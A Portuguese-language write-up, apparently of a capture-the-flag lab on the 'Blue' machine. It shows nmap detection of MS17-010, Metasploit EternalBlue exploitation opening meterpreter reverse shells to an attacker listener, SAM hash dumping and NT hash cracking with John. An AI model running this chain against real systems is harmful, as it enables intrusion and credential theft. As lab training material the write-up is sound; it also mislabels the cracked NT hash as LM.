# Blue
## Resumo
Nessa sala iremos fazer o recon e explorar uma vuln incorreta...

O EternalBlue é um exploit de ataque cibernético desenvolvido pela Agência de Segurança Nacional dos Estados Unidos da América. Foi divulgado pelo grupo de hackers Shadow Brokers em 14 de abril de 2017, um mês depois que a Microsoft lançou correções para a vulnerabilidade. Em 12 de maio de 2017, o ransomware mundial WannaCry usou este exploit para atacar computadores não corrigidos
# Recon 
Nessa interação recebemos o $IP. Vamos fazer uma varredura com NMAP:
```BASH
$nmap $IP 
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
```
Então não temos Servidor web e provavelmente estamos lidando com Windows.

Tentei enumerar o SMB, Mas sem sucesso Tambem. Vamos nos Apreofundar:
```BASH
nmap $IP --vuln vuln
Host script results:
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

Nmap done: 1 IP address (1 host up) scanned in 125.34 seconds

```
Então e isso. uma CVE. Como o lab pede, vamos Iniciar o msfconsole e parti para a segunda etapa.
## Acesso Inicial

Vamos sem enrolaçao:
```BASH
msfconsole -q
[msf](Jobs:0 Agents:0) >> grep MS17-010 search exploit
   3324  exploit/windows/smb/ms17_010_eternalblue                                                                                                 2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3334  exploit/windows/smb/ms17_010_psexec                                                                                                      2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3343  auxiliary/admin/smb/ms17_010_command                                                                                                     2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
[msf](Jobs:0 Agents:0) >> use 3324
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.c
                                             om/docs/using-metasploit/basics/using-metasploit.
                                             html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenti
                                             cation. Only affects Windows Server 2008 R2, Wind
                                             ows 7, Windows Embedded Standard 7 target machine
                                             s.
   SMBPass                         no        (Optional) The password for the specified usernam
                                             e
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Targ
                                             et. Only affects Windows Server 2008 R2, Windows
                                             7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only a
                                             ffects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, no
                                        ne)
   LHOST     10.213.40.86     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set LHOST tun0
LHOST => [REDACTED]
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> exploit 
(Meterpreter 1)(C:\Windows\system32) > 

```
##  Elavate Priv
```BASH
C^

[msf](Jobs:1 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> search shell_to_meter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter  .                normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

[msf](Jobs:1 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> use 0
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connectio
                                       n
   LHOST                     no        IP of host that will receive the connection from the pa
                                       yload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on


View the full module info with the info, or info -d command.

[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> sessions 

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-P   IP-ATTACKER:4444 -> vitimic:49191 (vitimic)

[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> set SESSION 2
SESSION => 2
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> run
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[-] Job 0 is listening on IP ATACCKER and port 4433
[-] A job is listening on the same local port
[-] Failed to start exploit/multi/handler on 4433, it may be in use by another process.
[*] Post module execution completed
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> set LPORT 4445
LPORT => 4445
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> run
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.6.39.247:4445 
[*] Post module execution completed
[msf](Jobs:2 Agents:1) post(multi/manage/shell_to_meterpreter) >> 
[*] Sending stage (203846 bytes) to 10.201.64.155
[*] Meterpreter session 3 opened (ATACCKER:4445 -> 10.201.64.155:49192) at 2025-11-07 20:39:23 -0300
[*] Stopping exploit/multi/handler

[msf](Jobs:1 Agents:2) post(multi/manage/shell_to_meterpreter) >> sessions

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-P  10.6.39.247:4444 -> 10.201.6
                                     C                            4.155:49191 (10.201.64.155)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-P  10.6.39.247:4445 -> 10.201.6
                                     C                            4.155:49192 (10.201.64.155)

[msf](Jobs:1 Agents:2) post(multi/manage/shell_to_meterpreter) >> sessions -i 3
[*] Starting interaction with 3...

(Meterpreter 3)(C:\Windows\system32) 
```
Após Execultar o exploit estamos como NT/Administrator, Então não a necessidades de escalar.

Em um ambiente real nos Procurarioamos arquivos de valor e maneiras de estabelecer pessistencia.
## Quebrando Hashs:
```BASH
(Meterpreter 3)(C:\Users\Public) > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
C^
echo "ffb43f0de35be4d9917ac0cc8ad57f8d" >> hash2.txt
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt --format=NT
[REDACTED]         (?)   
```
## Aprendizados:
Aprendemos sobre o EternalBlue;

Consolidamos aprendizados no MSFconsole;

Praticamos a quebra de HASH LM;

Nosso maior objetivo foi concluido: Tirar o maximo de aprendizado!

# Hack The WOLD!
